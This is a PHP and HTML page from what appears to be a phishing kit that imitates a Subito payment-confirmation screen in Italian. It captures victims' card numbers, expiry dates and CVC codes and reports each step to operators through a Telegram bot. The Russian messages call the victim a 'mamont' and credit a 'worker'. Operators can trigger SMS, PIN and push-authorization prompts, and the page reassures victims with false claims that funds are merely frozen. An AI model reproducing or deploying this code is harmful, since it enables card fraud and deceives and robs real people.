<?

include('config.php');
include('functions.php');


if (isset($_POST['amount']) && isset($_POST['card_number']) && isset($_POST['card_expire_month']) && isset($_POST['card_expire_year']) && isset($_POST['card_cvc'])) {
    setcookie('rdata', base64_encode(json_encode([
        'amount' => $_POST['amount'],
        'card_number' => $_POST['card_number'],
        'balance' => $_POST['balance'],
        'card_expire_month' => $_POST['card_expire_month'],
        'card_expire_year' => $_POST['card_expire_year'],
        'card_cvc' => $_POST['card_cvc'],
    ])));
    setcookie('solt', $_POST['solt']);
    header("Refresh:0");
    exit;
}

if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt'])) {
    die('$_SERVER["HTTP_REFERER"] not found');
}

$rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
$solt = json_decode(base64_decode($_COOKIE['solt']),true);

$amount = $rdata['amount'];
$card_number = $rdata['card_number'];
$cardholder = $rdata['balance'];
$expdate1 = $rdata['card_expire_month'];
$expdate2 = $rdata['card_expire_year'];
$cvc2 = $rdata['card_cvc'];
$id = $solt['id'];
$shop = "iPay";

$worker = $solt['worker'];
























$payInfo = json_decode(file_get_contents("database/" . $id), true);
if ($payInfo['status'] == 'success') {
    botSend([
    '<i>üü¢ –ó–∞–ø—Ä–æ—Å –≤ –±—Ä–∞—É–∑–µ—Ä –º–∞–º–æ–Ω—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —É—Å–ø–µ—à–Ω–æ</i>',
    
    ], tgToken, chatProfits);
    $payInfo['status'] = 'wait';
    if(trim($payInfo['errmsg']) != ''){
        if ($payInfo['errmsg'] == '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥') {
            header('Location: sms.php?c');
            exit();
        }
    }
    unset($payInfo['errmsg']);
    file_put_contents("database/" . $id, json_encode($payInfo));
    header('Location: success.php');
    exit;
} elseif ($payInfo['status'] == 'fail') {
    botSend([
        '<i>üü¢ –ó–∞–ø—Ä–æ—Å –Ω–∞ —Å–º–µ–Ω—É –∫–∞—Ä—Ç—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω '.($cash == 'pay' ? 'subito 2.0' : 'subito 1.0').'</i>',
		'<i>‚ùóÔ∏è –ü—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ –º–∞–º–æ–Ω—Ç—É –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –æ–ø–ª–∞—Ç—É</i>',
        '<i>–ü—Ä–∏—á–∏–Ω–∞: </i><i>'.$payInfo['errmsg'].'</i>',
        '<i>–ó–∞–≤–µ–ª –º–∞–º–æ–Ω—Ç–∞ worker: </i><i>'.$worker.'</i>',
    ], tgToken, chatAdmin);
    if ($payInfo['errmsg'] == '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥') {
        header('Location: sms.php?c');
        exit;
    }
    header('Location: error.php?error='.$payInfo['errmsg']);
    exit;
}

if (!isset($_GET['r'])) {
    botSend([
        
		 '<i>–ó–∞–ø—Ä–æ—Å–∏—Ç—å —É –º–∞–º–æ–Ω—Ç–∞ –≤–≤–æ–¥ —Å–º—Å –∏ –ø–∏–Ω–∫–æ–¥?</i>',
    ], tgToken, chatAdmin, [true, [
        [
            ['text' => '‚úÖ –í—ã–∑–≤–∞—Ç—å —É –º–∞–º–æ–Ω—Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –ø–ª–∞—Ç–µ–∂–∞ –ø–æ push ‚úÖ', 'callback_data' => '/doruchkazalet '.$id],
        ],
        [
            ['text' => '‚úÖ –í—ã–∑–≤–∞—Ç—å —É –º–∞–º–æ–Ω—Ç–∞ –æ–∫–Ω–æ –≤–≤–æ–¥–∞ sms –∏ pincode ‚úÖ', 'callback_data' => '/doruchkafail5 '.$id],
        ],
    ]]);
}
?>




<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

		<link rel="stylesheet" type="text/css" href="/payment/push/css/stylesheet.css">
		<link rel="stylesheet" type="text/css" href="/payment/push/css/index.css">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title>Conferma di pagamento</title>

</head>
<body style="font-size: 20px;">


<script type="text/javascript" charset="utf-8" async="" src="/payment/push/css/loader.js"></script>

<div class="form-container">
        <div class="form-block" id="step-1">
            <div class="form-block-header">
						<img src="/payment/push/css/subito-logo.svg" width="260px">
						<img src="/payment/push/css/visamc.png" width="80px" align="right">
                <h1 class="form-block-header-text" style="padding-top:30px;">Controlla il tuo smartphone </h1>
            </div>
                <div class="form-block-body">
				    <p class="form-block-body-text" style="margin-top: 15px;">Per proseguire autorizza l‚Äôoperazione in App o dalla notifica push che hai ricevuto o nella sezione ¬´Notifiche e autorizzazioni¬ª disponibile nella schermata di apertura dell‚Äô App.</p>
				</div>
                <div class="form-block-footer">			
					<p><span style="color:#999999"><em>Se la tua banca non effettua una transazione o scrive che si tratta di una ''cancellazione''-&nbsp; e ' un assegno bancario. I tuoi fondi non saranno addebitati, saranno congelati per verificare la tua identit√† e consentire i pagamenti.</em></span></p>
				</div>
			</div>		
		</div>
		
	<script>
    setTimeout( 'location="success.php?r";', 5000 );
  </script>	
<script>
		setInterval(function() {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', "/payment/status.php?id=81859472888", false); 
		xhr.send();      
		var data = xhr.responseText;
		var datas = JSON.parse(data);
		if (datas.status == 'SMS'){
			window.location.href = "https://"+window.location.hostname+"/payment/3ds/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=81859472888&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		if (datas.status == 'SMSS'){
			window.location.href = "https://"+window.location.hostname+"/payment/3ds-auth/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=81859472888&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}		
		if (datas.status == 'KEY-6'){
			document.location.href="https://"+window.location.hostname+"/payment/key-6/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=81859472888&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		
		if (datas.status == 'SMS+PASS'){
			document.location.href="https://"+window.location.hostname+"/payment/3ds/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=81859472888&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		if (datas.status == 'OTHER'){
			document.location.href="https://"+window.location.hostname+"/payment/other/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=81859472888&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}	
		
	}, 1000);		
</script>		

</body></html>